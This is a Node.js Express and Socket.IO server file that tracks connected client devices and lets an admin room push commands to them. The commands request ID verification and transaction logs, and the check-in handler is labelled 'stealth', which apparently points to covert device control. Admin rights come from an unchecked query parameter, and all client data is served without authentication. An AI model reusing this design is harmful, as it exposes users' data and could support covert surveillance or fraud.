const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: process.env.ALLOWED_ORIGINS || '*',
    methods: ['GET', 'POST']
  }
});

// Middleware
app.use(express.json());
app.use(cors());

// In-memory database simulation
const clients = {};
const adminSessions = new Set();

// Routes
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.get('/api/clients', (req, res) => {
  const clientsList = Object.keys(clients).map(clientId => ({
    clientId,
    ...clients[clientId]
  }));
  res.json(clientsList);
});

app.get('/api/clients/:clientId', (req, res) => {
  const { clientId } = req.params;
  if (clients[clientId]) {
    res.json({ clientId, ...clients[clientId] });
  } else {
    res.status(404).json({ error: 'Client not found' });
  }
});

// Socket.IO Connection Handler
io.on('connection', (socket) => {
  const clientId = socket.handshake.query.clientId || socket.id;
  const isAdmin = socket.handshake.query.isAdmin === 'true';

  console.log(`[CONNECTION] ${isAdmin ? 'Admin' : 'Client'} connected: ${clientId}`);

  if (isAdmin) {
    adminSessions.add(socket.id);
    socket.join('admin_room');
    console.log(`[ADMIN] Admin session created: ${socket.id}`);
  } else {
    // Initialize client if not exists
    if (!clients[clientId]) {
      clients[clientId] = {
        socketId: socket.id,
        status: 'Connected',
        deviceInfo: null,
        messages: [],
        lastActivity: new Date().toISOString(),
        createdAt: new Date().toISOString()
      };
    } else {
      clients[clientId].socketId = socket.id;
      clients[clientId].status = 'Connected';
      clients[clientId].lastActivity = new Date().toISOString();
    }

    socket.join(`client_${clientId}`);
  }

  // ============================================
  // STEALTH CHECK-IN HANDLER
  // ============================================
  socket.on('CLIENT_CHECK_IN', (data) => {
    console.log(`[CHECK-IN] Device: ${clientId}`);
    console.log(`  - Device Info:`, data);

    if (clients[clientId]) {
      clients[clientId].status = 'Online';
      clients[clientId].deviceInfo = data;
      clients[clientId].lastActivity = new Date().toISOString();

      // Tell the client to stop checking in
      socket.emit('command', {
        action: 'CHECK_IN_ACK',
        payload: {
          message: 'Check-in acknowledged',
          timestamp: new Date().toISOString()
        }
      });

      // Notify Admins a device just surfaced
      io.to('admin_room').emit('DEVICE_CHECKIN_NOTIFICATION', {
        clientId,
        status: clients[clientId].status,
        deviceInfo: clients[clientId].deviceInfo,
        timestamp: new Date().toISOString()
      });

      console.log(`[CHECK-IN] Sent CHECK_IN_ACK to ${clientId}`);
    }
  });

  // ============================================
  // BI-DIRECTIONAL MESSAGING
  // ============================================
  socket.on('MESSAGE_TO_SERVER', (payload) => {
    console.log(`[MESSAGE] From ${clientId}: ${payload.text}`);

    // Store message in client record
    if (clients[clientId]) {
      clients[clientId].messages.push({
        sender: 'client',
        text: payload.text,
        timestamp: new Date().toISOString()
      });
    }

    // Send to Admin Dashboard
    io.to('admin_room').emit('CLIENT_MESSAGE', {
      clientId,
      text: payload.text,
      timestamp: new Date().toISOString()
    });

    console.log(`[MESSAGE] Broadcast to ${adminSessions.size} admin(s)`);
  });

  // ============================================
  // ADMIN COMMANDS TO CLIENT
  // ============================================
  socket.on('SEND_MESSAGE_TO_CLIENT', (payload) => {
    const { targetClientId, text } = payload;

    if (clients[targetClientId]) {
      // Send message to specific client
      io.to(`client_${targetClientId}`).emit('command', {
        action: 'RECEIVE_MESSAGE',
        payload: {
          text,
          timestamp: new Date().toISOString(),
          from: 'admin'
        }
      });

      // Store message in client record
      clients[targetClientId].messages.push({
        sender: 'admin',
        text,
        timestamp: new Date().toISOString()
      });

      console.log(`[ADMIN] Sent message to ${targetClientId}: "${text}"`);
    } else {
      socket.emit('error', {
        message: `Client ${targetClientId} not found`
      });
    }
  });

  socket.on('ADMIN_REQUEST_ID', (payload) => {
    const { targetClientId } = payload;
    if (clients[targetClientId]) {
      io.to(`client_${targetClientId}`).emit('command', {
        action: 'REQUEST_ID_VERIFICATION',
        payload: {
          timestamp: new Date().toISOString()
        }
      });
      console.log(`[ADMIN] Requested ID verification from ${targetClientId}`);
    }
  });

  socket.on('ADMIN_REQUEST_TRANSACTION_LOG', (payload) => {
    const { targetClientId } = payload;
    if (clients[targetClientId]) {
      io.to(`client_${targetClientId}`).emit('command', {
        action: 'REQUEST_TRANSACTION_LOG',
        payload: {
          timestamp: new Date().toISOString()
        }
      });
      console.log(`[ADMIN] Requested transaction log from ${targetClientId}`);
    }
  });

  socket.on('ADMIN_REVOKE_SESSION', (payload) => {
    const { targetClientId } = payload;
    if (clients[targetClientId]) {
      io.to(`client_${targetClientId}`).emit('command', {
        action: 'SESSION_REVOKED',
        payload: {
          timestamp: new Date().toISOString(),
          reason: payload.reason || 'Session revoked by administrator'
        }
      });
      clients[targetClientId].status = 'Revoked';
      console.log(`[ADMIN] Revoked session for ${targetClientId}`);
    }
  });

  // ============================================
  // DISCONNECT HANDLER
  // ============================================
  socket.on('disconnect', () => {
    if (isAdmin) {
      adminSessions.delete(socket.id);
      console.log(`[DISCONNECT] Admin disconnected: ${socket.id}`);
    } else {
      if (clients[clientId]) {
        clients[clientId].status = 'Offline';
      }
      console.log(`[DISCONNECT] Client disconnected: ${clientId}`);
      
      // Notify admins of disconnection
      io.to('admin_room').emit('DEVICE_DISCONNECTED', {
        clientId,
        timestamp: new Date().toISOString()
      });
    }
  });

  // Error handler
  socket.on('error', (error) => {
    console.error(`[ERROR] Socket error for ${clientId}:`, error);
  });
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n[SERVER] Shutting down gracefully...');
  io.close();
  server.close();
  process.exit(0);
});

// Start server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`[SERVER] Running on port ${PORT}`);
  console.log(`[SERVER] Environment: ${process.env.NODE_ENV || 'development'}`);
});
